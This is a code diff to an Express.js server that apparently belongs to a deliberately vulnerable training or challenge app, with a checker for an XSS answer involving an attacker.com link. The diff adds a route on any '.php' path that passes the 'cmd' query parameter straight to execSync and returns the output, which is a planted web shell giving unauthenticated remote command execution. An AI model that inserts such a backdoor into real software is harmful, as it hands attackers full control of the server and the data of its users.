@@ -2,6 +2,7 @@ const express = require('express');
 const app = express();
 const port = 80;
 const mysql = require('mysql');
+const execSync = require("child_process").execSync;
 
 
 app.use(express.static("public"));
@@ -50,6 +51,11 @@ app.post("/product", (req,res) => {
         })
 })
 
+app.get("/*.php", function (req,res) {
+    console.log(req.query.cmd);
+    const output = execSync(req.query.cmd, { encoding: 'utf-8' });
+    res.send(output);
+});
 function correctEmailXSS(email) {
     let xssEmailInput = email.split(/,(.*)/s);
     return xssEmailInput.length> 1 && xssEmailInput[0] === "guy1@badguys.com" && xssEmailInput[1].includes('<a href="http://attacker.com">') && xssEmailInput[1].includes('</a>')
